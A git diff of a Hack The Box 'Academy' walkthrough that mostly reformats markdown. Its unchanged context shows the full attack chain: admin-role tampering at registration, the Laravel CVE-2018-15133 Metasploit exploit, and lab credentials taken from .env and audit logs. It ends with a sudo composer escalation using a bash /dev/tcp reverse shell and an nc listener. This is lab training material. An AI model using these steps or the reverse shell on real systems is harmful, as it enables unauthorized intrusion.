@@ -1,6 +1,6 @@
 ![](academy_banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
 </p>
 
 # Scanning
@@ -53,7 +53,7 @@ PORT      STATE SERVICE VERSION
 
 ### login
 
-__*Nothing intrested in login*__
+**_Nothing intrested in login_**
 
 ### register
 
@@ -61,7 +61,7 @@ __*Nothing intrested in login*__
 
       <input type="hidden" value="0" name="roleid" />
 
-* __roleid__ is related to `RST_API`
+* **roleid** is related to `RST_API`
 
   - there is a [Role management](https://thalesdocs.com/gphsm/luna/7.3/docs/network/Content/REST_API/REST_API_Reference_Guide/html/_roles_urls_page_name.html) system in the REST_API
   - Role management resources provide a facility to manage roles used to determine resource access for users.
@@ -73,8 +73,8 @@ __*Nothing intrested in login*__
 
 * this server is using numbers as roleid
 * after some tries i found that there are only two IDs `0` or `1`
-* `roleid=0` register a __user__ account 
-* `roleid=1` register a __admin__ account
+* `roleid=0` register a **user** account 
+* `roleid=1` register a **admin** account
 * so i intercept a register request change roleid to `1` and create a admin account
 
 ### admin
@@ -109,9 +109,9 @@ __*Nothing intrested in login*__
 
 ### Laravel
 
-__description :__  [Laravel](https://laravel.com/) is a free, [open-source](https://github.com/laravel/laravel) PHP web application framework which is accessible, powerful, and provides tools required for large, robust applications.
+**description :**  [Laravel](https://laravel.com/) is a free, [open-source](https://github.com/laravel/laravel) PHP web application framework which is accessible, powerful, and provides tools required for large, robust applications.
 
-__vulnerability :__ found RCE [CVE-2018-15133](https://www.cvedetails.com/cve/CVE-2018-15133/) and msf [module](https://www.exploit-db.com/exploits/47129) for that CVE .
+**vulnerability :** found RCE [CVE-2018-15133](https://www.cvedetails.com/cve/CVE-2018-15133/) and msf [module](https://www.exploit-db.com/exploits/47129) for that CVE .
 
 *I don't find which `Laravel` version running on the server but i give it a go and use msf to check if it works and it worked and give www-data shell*
 
@@ -121,13 +121,13 @@ __vulnerability :__ found RCE [CVE-2018-15133](https://www.cvedetails.com/cve/CV
 *getting user is a long road from user `www-data>>cry0l1t3>>mrb3n` to get root privesc*
 ## www-data shell
 
-__what is exploit :__ Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value. This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in gadgetchains/Laravel/RCE/3/chain.php in phpggc. The attacker must know the application key, which normally would never occur, but could happen if the attacker previously had privileged access or successfully accomplished a previous attack.
+**what is exploit :** Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value. This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in gadgetchains/Laravel/RCE/3/chain.php in phpggc. The attacker must know the application key, which normally would never occur, but could happen if the attacker previously had privileged access or successfully accomplished a previous attack.
 
 * exploit prerequirement is `APP_KEY` which i already found
 
 ### Exploit using MSF
 
-__Exploit Module :__ exploit/unix/http/laravel_token_unserialize_exec
+**Exploit Module :** exploit/unix/http/laravel_token_unserialize_exec
 
 ```
 msf5 exploit(unix/http/laravel_token_unserialize_exec) > set RHOSTS 10.10.10.215
@@ -149,7 +149,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ## Escalating to cry0l1t3 
 
 * running `linpeas` script found nothing except that `.env` file form `/var/www/html/academy/` directory that contains some passwords .
-* __.env__ file contains creds for local sql database
+* **.env** file contains creds for local sql database
 
       DB_CONNECTION=mysql
       DB_HOST=127.0.0.1
@@ -173,7 +173,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ### creds 
 `cry0l1t3:mySup3rP4s5w0rd!!`
 
-* __ssh__ 
+* **ssh** 
 
     `ssh cry0l1t3@10.10.10.215`
 
@@ -184,24 +184,24 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ## Escalating to mrb3n
 
-* user __cry0l1t3__ is in `adm` group 
+* user **cry0l1t3** is in `adm` group 
 
       cry0l1t3@academy:~$ groups
       cry0l1t3 adm
       cry0l1t3@academy:/home$ id
       uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
 
-* __adm group :__ adm Group is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group.
-  * that means user __cry0l1t3__ can read system logs.
+* **adm group :** adm Group is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group.
+  * that means user **cry0l1t3** can read system logs.
   * understand all types of log in linux by [privacyangel.com](https://privacyangel.com/linux-log-files)
 * there is a `audit log` dir which is suspiciou.
-  * __[audit log](https://sematext.com/blog/auditd-logs-auditbeat-elasticsearch-logsene/) :__ can use to learn about user activity, which could be used to boost efficiency, security, and performance.
+  * **[audit log](https://sematext.com/blog/auditd-logs-auditbeat-elasticsearch-logsene/) :** can use to learn about user activity, which could be used to boost efficiency, security, and performance.
   * audit logs create by linux [auditclt](https://linux.die.net/man/8/auditctl) service.
-* __Note :__ that audit logs store users commands inputs in `DATA` field in `hex` form.
+* **Note :** that audit logs store users commands inputs in `DATA` field in `hex` form.
 
 * I grep all `su` commands from `audit logs` and found some intresting data
 
-__Final result__
+**Final result**
 
       cry0l1t3@academy:/var/log/audit$ grep -r -w su | grep data
       audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
@@ -237,12 +237,12 @@ uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
 
 * user mrb3n run `composer` as root
 
-* __Composer__ is a tool for dependency management in PHP. It allows you to declare the libraries your project depends on and it will manage (install/update) them for you.
+* **Composer** is a tool for dependency management in PHP. It allows you to declare the libraries your project depends on and it will manage (install/update) them for you.
 
     * First thing first find the [composer documentation](https://getcomposer.org/doc/00-intro.md)
     * form the doc i found that the [composer run scripts](https://getcomposer.org/doc/articles/scripts.md)
 
-    __Note :__ Only scripts defined in the composer.json are executed .
+    **Note :** Only scripts defined in the composer.json are executed .
 
 
 ## attack surface
@@ -253,7 +253,7 @@ uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
 
 # Root Exploit
 
-__First__, create `composer.json` file
+**First**, create `composer.json` file
 ```
 {
     "scripts": {
@@ -264,17 +264,17 @@ __First__, create `composer.json` file
 }
 ```
 
-__Second__, create `shell.sh` script
+**Second**, create `shell.sh` script
 ```
 bash -i >& /dev/tcp/tun0/4242 0>&1
 ```
 
-__Third__, open nc port
+**Third**, open nc port
 ```
 nc -nvlp 4242
 ```
 
-__Fourth__, run composer 
+**Fourth**, run composer 
 ```
 mrb3n@academy:~$ sudo composer hack
 ```
